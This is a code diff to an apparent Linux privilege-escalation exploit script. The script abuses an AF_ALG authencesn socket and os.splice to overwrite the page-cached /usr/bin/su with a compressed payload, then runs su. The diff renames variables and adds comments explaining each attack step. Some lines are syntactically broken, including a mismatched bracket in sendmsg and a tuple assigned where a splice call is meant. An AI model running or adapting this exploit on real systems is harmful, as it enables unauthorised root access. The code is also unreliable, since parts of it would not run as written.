@@ -10,6 +10,8 @@ def toBytes(_hex):
     return bytes.fromhex(_hex)
 
 '''
+Function c() --> copyFail()
+
 Variable Translations
 
 Parameters (f,t,c) --> (file,index,byteData)
@@ -22,9 +24,9 @@ _ = addr
 o = offset
 i = zeros
 r,w = read, write
-n = n
+n = fdSplice
 '''
-def c(file, index, byteData):
+def copyFail(file, index, byteData):
     #socket family=38 (AF_ALG), type=5 (SOCK_SEQPACKET) , protocol=0 (default)
     ALFSocket = socket.socket(38, 5, 0)
     #bind to authencesn AEAD template
@@ -43,32 +45,34 @@ def c(file, index, byteData):
     offset = index+4 #increment by 4 bytes of payload
     zeros = toBytes('00')
 
-    #send payload, last AUTHSIZE (4) bytes are written (as seqno_lo)
+    #send payload buffer, last AUTHSIZE (4) bytes are written (as seqno_lo)
+    #the ciphertext is fabricated to fail
+    #([msg], ALG_SET_OP (3), ALG_SET_IV (2), ALG_SET_ASSOCLEAN (4)
     client.sendmsg([b"A"*4+byteData],
-                   [(sockLevel, 3, zeros*4),
-                    (sockLevel,2,b'\x10'+zeros*19),
-                    (sockLevel, 4, b'\x08'+zeros*3),
+                    [sockLevel, 3, zeros*4), #SET_OP to decrypt
+                    (sockLevel,2,b'\x10'+zeros*19), #SET_IV
+                   (sockLevel, 4, b'\x08'+zeros*3), #SET_ASSOCLEN (AAD)
                     ], 32768)
     
     read, write = os.pipe()
-    n = os.splice #splice passes by reference
+    fdSplice = os.splice #splice passes by reference
     #splice /usr/bin/su to write
-    n = (file, write, offset, offset_src=0) 
+    fdSplice = (file, write, offset, offset_src=0) 
     #splice AF_ALG socket to read:
     #the payload is written (4 bytes at a time) into the cached copy of su
-    n(read, client.fileno(), offset)
+    fdSplice(read, client.fileno(), offset)
 
     try:
         client.recv(8+index)
     except:
         return 0
 
-file = os.open("/usr/bin/su", 0)
+file = os.open("/usr/bin/su", 0) #open readonly target su
 i = 0
-decomp = zlib.decompress(toBytes(PAYLOAD))
+decomp = zlib.decompress(toBytes(PAYLOAD)) #decode and decompress payload
 
 while i<len(decomp):
-    c(file, i, decomp[i:i+4])
+    copyFail(file, i, decomp[i:i+4]) #iterate through payload bytes
     i += 4
 
-os.system("su")
+os.system("su") #call modified target file
